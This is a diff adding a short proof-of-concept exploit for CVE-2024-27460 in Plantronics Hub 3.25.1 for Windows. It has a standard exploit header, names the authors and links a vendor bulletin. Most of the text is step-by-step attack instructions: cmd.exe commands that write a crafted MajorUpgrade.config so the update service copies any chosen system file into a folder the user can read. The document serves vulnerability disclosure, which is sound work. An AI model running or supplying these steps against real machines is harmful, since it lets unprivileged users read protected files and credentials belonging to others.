@@ -1,0 +1,25 @@
+# Exploit Title: Plantronics Hub 3.25.1 – Arbitrary File Read
+# Date: 2024-05-10
+# Exploit Author: Farid Zerrouk from Deloitte Belgium, Alaa Kachouh from
+Mastercard
+# Vendor Homepage:
+https://support.hp.com/us-en/document/ish_9869257-9869285-16/hpsbpy03895
+# Version: Plantronics Hub for Windows version 3.25.1
+# Tested on: Windows 10/11
+# CVE : CVE-2024-27460
+
+As a regular user drop a file called "MajorUpgrade.config" inside the
+"C:\ProgramData\Plantronics\Spokes3G" directory. The content of
+MajorUpgrade.config should look like the following one liner:
+^|^|<FULL-PATH-TO-YOUR-DESIRED-FILE>^|> MajorUpgrade.config
+
+Exchange <FULL-PATH-TO-YOUR-DESIRED-FILE> with a desired file to read/copy
+(any file on the system). The desired file will be copied into C:\Program
+Files (x86)\Plantronics\Spokes3G\UpdateServiceTemp
+
+Steps to reproduce (POC):
+- Open cmd.exe
+- Navigate using cd C:\ProgramData\Plantronics\Spokes3G
+- echo ^|^|<FULL-PATH-TO-YOUR-DESIRED-FILE>^|> MajorUpgrade.config
+- Desired file will be copied into C:\Program Files
+(x86)\Plantronics\Spokes3G\UpdateServiceTemp
